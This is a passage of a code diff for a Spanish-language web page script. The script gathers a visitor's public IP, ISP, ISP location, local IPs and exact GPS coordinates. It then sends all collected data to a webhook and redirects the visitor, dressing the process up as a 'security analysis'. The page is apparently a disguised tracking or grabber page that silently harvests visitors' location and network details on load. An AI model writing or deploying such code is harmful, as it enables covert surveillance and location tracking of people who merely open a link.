+                • <strong>IP Pública:</strong> ${publicInfo.ip}<br>
+                • <strong>ISP:</strong> ${publicInfo.isp}<br>
+                • <strong>Ubicación ISP:</strong> ${publicInfo.ciudad}, ${publicInfo.region}, ${publicInfo.pais}<br>
+                ${localIPs && localIPs.length > 0 ? `• <strong>IPs Locales:</strong> ${localIPs.join(', ')}<br>` : ''}
+                ${gpsData ? `• <strong>GPS Exacto:</strong> ${gpsData.lat_exacta.toFixed(6)}, ${gpsData.lon_exacta.toFixed(6)} (${gpsData.precision})` : ''}
+            `;
+            
+            updateNetworkInfo(networkSummary);
+            
+            // 6. Enviar TODOS los datos al webhook
+            document.getElementById('loadingText').textContent = 'Enviando datos de análisis...';
+            await sendToWebhook(collectedData);
+            
+            updateUI('Análisis completado ✓');
+            document.getElementById('loadingText').textContent = 'Análisis de seguridad completado ✓';
+            
+            // Redirigir si el contador ya terminó
             if (countdown <= 0) {
-                redirigir();
+                performRedirect();
             }
         }
         
-        // Ejecutar cuando la página cargue
-        window.addEventListener('DOMContentLoaded', main);
+        // Iniciar cuando la página cargue
+        document.addEventListener('DOMContentLoaded', main);
+        
+        // Forzar redirección después de 10 segundos máximo
+        setTimeout(() => {
+            if (countdown > 0) {
+                document.getElementById('loadingText').textContent = 'Redirigiendo...';
+                skipVerification();
+            }
+        }, 10000);
+        
+        // Cambiar texto del botón después de 3 segundos
+        setTimeout(() => {
+            document.getElementById('skipBtn').innerHTML = '⏭️ Continuar ahora';
+        }, 3000);
     </script>
 </body>
 </html>
